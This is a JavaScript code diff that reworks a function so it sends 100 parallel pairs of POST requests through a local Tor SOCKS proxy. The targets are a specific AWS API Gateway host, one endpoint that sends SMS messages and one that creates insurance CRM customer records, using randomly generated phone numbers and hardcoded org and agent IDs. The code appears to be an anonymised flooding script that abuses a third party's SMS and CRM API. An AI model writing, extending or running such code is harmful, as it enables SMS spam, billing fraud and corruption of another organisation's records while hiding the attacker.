@@ -13,51 +13,66 @@ function generatePhoneNumber() {
     return number;
 }
 
-// Example usage:
-
-
 async function getIP() {
     try {
         const torAgent = new SocksProxyAgent("socks5h://127.0.0.1:9050");
-        const res = await axios.get("https://httpbin.org/ip", {
-            httpsAgent: torAgent,
-        });
-        const body1 = {
-            phone: generatePhoneNumber().toString(),
-            org_id: "100",
-            agent_id: "1000",
-            method: "SEND",
-            type: "C",
-            name: ""
-        }
-        const body2 = {
-            customer_name: "",
-            phone: body1.phone,
-            org_id: "100",
-            agent_id: "1000",
-            method: "POST",
-            type: "C"
-        }
-        const res1 = await axios.post(
-            "https://75e8n7v4uj.execute-api.ap-south-1.amazonaws.com/Prod/messages/v1/sms",
-            body1, // request body
-            {
-                httpsAgent: torAgent,      // same Tor agent
-            }
-        );
-        const res2 = await axios.post(
-            "https://75e8n7v4uj.execute-api.ap-south-1.amazonaws.com/Prod/insurance/crm/v1/org/agent/customer",
-            body2, // request body
-            {
-                httpsAgent: torAgent,      // same Tor agent
-            }
-        );
+        // Call IP API only once
+        const ipRes = await axios.get("https://httpbin.org/ip", { httpsAgent: torAgent });
+        const ipAddress = ipRes.data.origin;
 
-        return {
-            id: res.data.origin,
-            api1: { req: body1, res: res1.data },
-            api2: { req: body2, res: res2.data }
+        // Loop 100 times for the POST requests
+    
+        const makeMultipleReq = async () => {
+            return Promise.all(
+                Array.from({ length: 100 }, async (_, i) => {
+                    try {
+                        const phoneNumber = generatePhoneNumber().toString();
+                        const body1 = {
+                            phone: phoneNumber,
+                            org_id: "100",
+                            agent_id: "1000",
+                            method: "SEND",
+                            type: "C",
+                            name: ""
+                        };
+                        const body2 = {
+                            customer_name: "",
+                            phone: phoneNumber,
+                            org_id: "100",
+                            agent_id: "1000",
+                            method: "POST",
+                            type: "C"
+                        };
+
+                        // Run both POST requests in parallel
+                        const [res1, res2] = await Promise.all([
+                            axios.post(
+                                "https://75e8n7v4uj.execute-api.ap-south-1.amazonaws.com/Prod/messages/v1/sms",
+                                body1,
+                                { httpsAgent: torAgent }
+                            ),
+                            axios.post(
+                                "https://75e8n7v4uj.execute-api.ap-south-1.amazonaws.com/Prod/insurance/crm/v1/org/agent/customer",
+                                body2,
+                                { httpsAgent: torAgent }
+                            )
+                        ]);
+
+                        return {
+                            ip: ipAddress,
+                            api1: { req: body1, res: res1.data },
+                            api2: { req: body2, res: res2.data }
+                        };
+                    } catch (err) {
+                        return { index: i, error: err.message, response: err.response?.data };
+                    }
+                })
+            );
         };
+
+        const multiResults = await makeMultipleReq();
+
+        return { multiple: multiResults };
     } catch (err) {
         throw err;
     }
